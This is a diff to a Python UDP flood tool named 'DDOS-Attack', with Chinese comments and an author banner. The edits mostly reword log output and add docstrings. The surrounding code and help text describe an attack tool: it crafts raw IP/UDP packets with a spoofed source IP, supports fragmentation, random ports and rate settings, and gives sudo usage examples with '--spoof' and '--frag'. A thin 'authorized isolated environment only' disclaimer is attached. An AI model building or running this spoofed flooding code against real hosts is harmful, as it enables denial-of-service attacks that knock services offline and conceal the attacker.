@@ -29,9 +29,9 @@ class Logger:
             self.fp.close()
 
 
-# ==================== 启动艺术字与法律警告（最先执行） ====================
+# ==================== 启动艺术字与法律警告（最先执行，保持原样） ====================
 def show_banner():
-    clear_screen()   # ← 原 os.system("clear")
+    clear_screen()
     print("MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM   Sucodesu")
     print("M       MMM M       MMM MMM     MMM MM       MM   Sucodesu")
     print("M  MMMM   M M  MMMM   M M   MMM   M M  MMMMM  M   Sucodesu")
@@ -53,7 +53,7 @@ def show_banner():
     print("Starting...")
     time.sleep(1)
 
-    clear_screen()   # ← 原 os.system("clear")
+    clear_screen()
     os.system("figlet DDOS-Attack")
     print("Author    : Su-StackTrace")
     print("GitHub    : https://github.com/BC-809/DDoS-Attack_t3g85hxb670.git")
@@ -62,6 +62,7 @@ def show_banner():
 
 # ==================== 连通性检查 ====================
 def check_target(ip, port, timeout=3):
+    """TCP 连通性测试（注意：TCP 可达 ≠ UDP 可达，仅作参考）"""
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.settimeout(timeout)
@@ -74,6 +75,7 @@ def check_target(ip, port, timeout=3):
 
 # ==================== 伪造 IP 包构造 ====================
 def build_ip_udp_packet(spoof_ip, target_ip, src_port, dst_port, payload):
+    """构造带伪造源 IP 的原始 IP + UDP 数据包"""
     ip_header_len = 20
     udp_header_len = 8
     total_len = ip_header_len + udp_header_len + len(payload)
@@ -104,12 +106,12 @@ def build_ip_udp_packet(spoof_ip, target_ip, src_port, dst_port, payload):
 # ==================== 参数解析 ====================
 def parse_args():
     parser = argparse.ArgumentParser(
-        description="[>]UDP Flood Attack Tool (仅用于授权的隔离环境)",
+        description="UDP Flood Attack Tool (仅用于授权的隔离环境)",
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""示例:
-  python DDOS-Attack_03_c.py -t 192.168.1.100 -p 53 -g 1
-  python DDOS-Attack_03_c.py -t 10.0.0.1 -p 80 -g 5 --random-port
-  sudo python DDOS-Attack_03_c.py -t 10.0.0.1 -p 53 -g 1 --spoof 1.2.3.4 --frag
+  python DDOS-Attack.py -t 192.168.1.100 -p 53 -g 1
+  python DDOS-Attack.py -t 10.0.0.1 -p 80 -g 5 --random-port
+  sudo python DDOS-Attack.py -t 10.0.0.1 -p 53 -g 1 --spoof 1.2.3.4 --frag
 """
     )
     parser.add_argument('-t', '--target', required=True,
@@ -188,25 +190,25 @@ def main():
     # ---------- 日志 ----------
     logger = Logger(args.log)
 
-    # ---------- 摘要 ----------
+    # ---------- 摘要（配置项用 [*]） ----------
     logger.log(f"\n[>] 攻击摘要:")
-    logger.log(f"    目标          : {args.target}:{args.port} (UDP)")
-    logger.log(f"    总包数        : {max_packets}")
-    logger.log(f"    包大小        : {packet_size} 字节")
+    logger.log(f"[*] 目标: {args.target}:{args.port} (UDP)")
+    logger.log(f"[*] 总包数: {max_packets}")
+    logger.log(f"[*] 包大小: {packet_size} 字节")
     if spoof_ip:
-        logger.log(f"    伪造源 IP     : {spoof_ip}")
+        logger.log(f"[*] 伪造源 IP: {spoof_ip}")
     if args.src_port:
-        logger.log(f"    源端口        : {args.src_port}")
+        logger.log(f"[*] 源端口: {args.src_port}")
     if args.rate > 0:
-        logger.log(f"    发包间隔      : {args.rate}s / 包")
+        logger.log(f"[*] 发包间隔: {args.rate}s / 包")
     if args.frag:
-        logger.log(f"    IP 分片       : 已启用")
+        logger.log(f"[*] IP 分片: 已启用")
     if args.random_port:
-        logger.log(f"    随机目标端口  : 已启用")
+        logger.log(f"[*] 随机目标端口: 已启用")
 
-    # ---------- 连通性检查 ----------
+    # ---------- 连通性检查（运行日志用 [>]） ----------
     if not args.no_check:
-        logger.log("[*] 正在检查目标连通性 (TCP)...")
+        logger.log("[>] 正在检查目标连通性 (TCP)...")
         if not check_target(args.target, args.port):
             logger.log("[!] 目标 TCP 不可达。注意：TCP 可达 ≠ UDP 可达，此处仅供参考。")
 
@@ -287,7 +289,7 @@ def main():
                 if current_target_port > 65534:
                     current_target_port = 1
 
-            # ---------- 按时间间隔输出进度 ----------
+            # ---------- 按时间间隔输出进度（运行日志用 [>]） ----------
             now = time.time()
             if now - last_report_time >= report_interval:
                 elapsed = now - start_time
@@ -310,7 +312,7 @@ def main():
         sock.close()
         elapsed = time.time() - start_time
         gb_total = sent_bytes / (1024 * 1024 * 1024)
-        logger.log(f"\n[+] 发送完成。总包数: {sent}, 总数据量: {gb_total:.4f} GB, "
+        logger.log(f"\n[>] 发送完成。总包数: {sent}, 总数据量: {gb_total:.4f} GB, "
                    f"丢弃: {dropped}, 用时: {elapsed:.2f} 秒")
         logger.close()
 
